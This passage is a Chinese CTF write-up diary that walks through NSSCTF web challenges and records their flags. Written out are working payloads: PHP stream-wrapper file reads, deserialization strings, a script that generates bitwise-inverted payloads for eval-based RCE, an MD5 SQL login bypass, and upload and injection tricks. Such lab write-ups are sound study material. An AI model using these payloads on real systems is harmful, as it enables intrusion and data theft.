[{"title":"nssctf写题日记","url":"/2025/09/10/nssctf/","content":"nssctf[第五空间 2021]WebFTP扫目录得到.git文件,发现存在config文件夹,发现存在phpinfo.php,访问得到flag\n\n\nNSSCTF&#123;523bbf70-90f8-4d24-b698-afe62065324a&#125;\n\n[LitCTF 2023]PHP是世界上最好的语言！！右边写rce就行\nNSSCTF&#123;6b69b03c-cc50-409c-b3a8-7221eb6968dc&#125;\n\n[LitCTF 2023]我Flag呢？\n\nNSSCTF&#123;9fbe5ec2-8489-45a5-95c3-7d812b136061&#125;\n\n[SWPUCTF 2021 ]caidao\n蚁剑就行,flag在根目录\n\nNSSCTF&#123;dd5ca420-ef4b-4dca-9282-cba263ab6772&#125;\n\n[SWPUCTF 2021 ]Do_you_know_http\n改ua头为WLLM即可,到下一关\n\n改referer为127.0.0.1即可,试了不行,改xff为127.0.0.1就行了\n\nNSSCTF&#123;5fc1788d-4c64-4643-bd36-730437e76d6a&#125;\n\n[SWPUCTF 2021 ]easyupload2.0传phtml即可,不浪费时间\n\nNSSCTF&#123;ad299558-a3d9-43da-b700-095613e9fcf4&#125;\n\n[SWPUCTF 2021 ]easyupload1.0抓包改mime为image&#x2F;jpeg即可\n\nWLLMCTF&#123;I_d0nt_w4nna_wak3up&#125;\n\nflag在环境变量里\n\nNSSCTF&#123;9043613f-14aa-42f3-b33f-83e1dce3c0e9&#125;\n\n[LitCTF 2023]导弹迷踪发现有game.js,打开即得flag\n\n\nNSSCTF&#123;y0u_w1n_th1s_!!!&#125;\n\n[SWPUCTF 2021 ]PseudoProtocolshint is hear Can you find out the hint.php?\nhttp://node7.anna.nssctf.cn:29272/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php\n\n得到\nPD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=&lt;?php//go to /test2222222222222.php?&gt;\n\n访问得到\n&lt;?phpini_set(&quot;max_execution_time&quot;, &quot;180&quot;);show_source(__FILE__);include(&#x27;flag.php&#x27;);$a= $_GET[&quot;a&quot;];if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;    echo &quot;success\\n&quot;;    echo $flag;&#125;?&gt;\n\nphp:&#x2F;&#x2F;input写入 I want flag得到flag\n\n或者使用\n?a=data://text/plain,I want flag\n\nNSSCTF&#123;00bca5ac-7378-4d18-b083-fd2cc0875472&#125;\n\n[SWPUCTF 2021 ]no_wakeup&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHaHa&#123;        public $admin;        public $passwd;        public function __construct()&#123;            $this-&gt;admin =&quot;user&quot;;            $this-&gt;passwd = &quot;123456&quot;;        &#125;        public function __wakeup()&#123;            $this-&gt;passwd = sha1($this-&gt;passwd);        &#125;        public function __destruct()&#123;            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;                include(&quot;flag.php&quot;);                echo $flag;            &#125;else&#123;                echo $this-&gt;passwd;                echo &quot;No wake up&quot;;            &#125;        &#125;    &#125;$Letmeseesee = $_GET[&#x27;p&#x27;];unserialize($Letmeseesee);?&gt;\n\n序列化字符串改一下对象属性个数就行\n&lt;?phpclass HaHaHa&#123;        public $admin;        public $passwd;        public function __construct()&#123;            $this-&gt;admin =&quot;admin&quot;;            $this-&gt;passwd = &quot;wllm&quot;;        &#125;    &#125;$a = new HaHaHa();echo serialize($a);?&gt;\n\nO:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125; //原来是2改为3\n\n\nNSSCTF&#123;5efb832a-30a5-478a-ba1b-6dacd265090d&#125;\n\n[LitCTF 2023]Follow me and hack me\n\nNSSCTF&#123;f3140228-a555-4eec-aac2-5eab8d9127d0&#125;\n\n[NCTF 2018]签到题抓index.php查看返回包即可\n\nflag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125;\n\n[LitCTF 2023]Pingping127.0.0.1然后抓包,在command后加管道符\n\n\n\nNSSCTF&#123;79672859-7f29-4f87-b82f-376d9f270e9d&#125;\n\n14.[SWPUCTF 2021 ]hardrce&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123;    $wllm = $_GET[&#x27;wllm&#x27;];    $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,];    foreach ($blacklist as $blackitem)    &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123;        die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;);    &#125;&#125;if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))&#123;    die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;);&#125;echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;eval($wllm);&#125;else&#123;    echo &quot;蔡总说：注意审题！！！&quot;;&#125;?&gt;\n\n使用取反脚本\n#!/usr/bin/env python# -*- coding: UTF-8 -*-&quot;&quot;&quot;@Project :PythonProject @File    ：取反脚本.py@IDE     :PyCharm @Author  :DY19sec@Date    :2025/4/20 13:12 &quot;&quot;&quot;import urllib.parse as urlparse# 获取用户输入的函数名和命令system = input(&#x27;[+]your function: &#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)command = input(&#x27;[+]your command: &#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)# 按位取反并转换为字节def invert_to_bytes(s):    return bytes([(~ord(c)) &amp; 0xFF for c in s])# 生成URL编码后的字符串encoded_system = urlparse.quote(invert_to_bytes(system))encoded_command = urlparse.quote(invert_to_bytes(command))# 输出最终结果print(f&#x27;[*] (~&#123;encoded_system&#125;)(~&#123;encoded_command&#125;);&#x27;)\n\n\n\nNSSCTF&#123;59931241-37d1-4c25-b575-0c04d47feb6c&#125;\n\n[BJDCTF 2020]easy_md5\n抓包得到信息\nselect * from &#x27;admin&#x27; where password=md5($pass,true)\n\n此处使用ffifdyop万能密码绕过。ffifdyop的MD5加密结果是276f722736c95d99e921722cf9ed621c，经过MySQL编码后会变成’or’6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密\n进入下一关,源码得到hint\n$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    header(&#x27;Location: levell14.php&#x27;);\n\nQNKCDZO240610708s878926199as155964671as214587387as214587387a挑两个上去\n\n下一关:\n&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;    echo $flag;&#125;\n\n数组绕过\nparam1[]=1&amp;param2[]=2\n\n\nNSSCTF&#123;e6cd9dd7-f3ea-4215-bac8-6078fb8a7116&#125;\n\n[NSSCTF 2022 Spring Recruit]ezgame前端有一个preload.js看看\n\nNSSCTF&#123;db5bc963-8bca-4c4c-b3ad-4bf678761cde&#125;\n\n[suctf 2019]EasySQL手动fuzz,一般的联合注入,报错注入都没有用,尝试一下堆叠注入发现可行,version();1正常回显\n*,1\n\n\nNSSCTF&#123;fe616752-38e6-48b7-bf05-bae4207c9eb9&#125;\n\n[GXYCTF 2019]Ping Ping Ping[SWPUCTF 2022 ]ez_ez_php&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123;        echo &quot;Nice!!!&quot;;        include($_GET[&quot;file&quot;]);    &#125;     else &#123;        echo &quot;Hacker!!&quot;;    &#125;&#125;else &#123;    highlight_file(__FILE__);&#125;//flag.php\n\n?file=php://filter/resource=flag.php\n\n回显如下:\nNice!!!NSSCTF&#123;flag_is_not_here&#125;real_flag_is_in_&#x27;flag&#x27;鎹釜鎬濊矾锛岃瘯璇昉HP浼崗璁憿\n\n\nNSSCTF&#123;224ead8f-72ef-4e59-8eca-c6955d7b4d2a&#125;\n\n[ZJCTF 2019]NiZhuanSiWei&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n这个先用php:&#x2F;&#x2F;input写入即可,然后再读useless.php的内容\n?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.phpPOSTwelcome to zjctf\n\n\n解码得到\n&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;$password = unserialize($password);echo $password;?&gt;  \n\n已经有echo,tostring自己会触发\nO:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n\nNSSCTF&#123;2186140d-c1a9-463c-bdc3-03cf2f56d9a3&#125;\n\n[SWPUCTF 2021 ]errorsqlmap一把梭\n\nNSSCTF&#123;8134250c-a5ad-4f6a-baab-54b780be6ecd&#125;\n\n[SWPUCTF 2021 ]easyupload3.0\n发现中间件是Apache,先传.htaccess,然后传1.jpg即可\n\nNSSCTF&#123;66aab468-488d-440f-915f-617037679ca9&#125;\n\n[LitCTF 2023]1zjs\n看这个js文件和php文件\n(+[![]]+[])[+[]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[+[]]+[]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[+!+[]]+[]+(![]+[])[+[]]+[+[]]+[]+[+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]]+[]+[+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(!![]+[])[!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])\n\njsfuck解码\nNSSCTF&#123;0ed61f00-c99f-4215-a38e-4fdf7feeae5c&#125;\n\n[LitCTF 